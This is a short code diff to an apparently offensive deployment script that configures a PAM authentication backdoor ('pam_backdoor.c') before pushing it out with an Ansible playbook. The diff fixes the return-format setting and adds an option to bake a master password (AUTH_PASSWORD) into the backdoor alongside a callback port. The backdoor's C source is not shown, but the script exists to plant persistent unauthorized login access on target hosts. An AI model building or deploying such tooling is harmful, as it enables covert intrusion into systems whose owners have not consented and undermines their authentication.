@@ -29,7 +29,10 @@ def setup():
     subprocess.run(f'sed -i "s/^#define CALLBACK_PORT.*/#define CALLBACK_PORT {args.port}/" ./pam_backdoor.c', shell=True, text=True)
 
     if(args.format):
-        subprocess.run(f'sed -i "s/^#define RET_FMT.*/#define RET_FMT \"{args.ip}\"/" ./pam_backdoor.c', shell=True, text=True)
+        subprocess.run(f'sed -i "s/^#define RET_FMT.*/#define RET_FMT \"{args.format}\"/" ./pam_backdoor.c', shell=True, text=True)
+
+    if(args.password):
+        subprocess.run(f'sed -i "s/^#define AUTH_PASSWORD.*/#define AUTH_PASSWORD \"{args.password}\"/" ./pam_backdoor.c', shell=True, text=True)
 
     subprocess.run('ansible-playbook main.yml -t setup', shell=True, text=True)
 
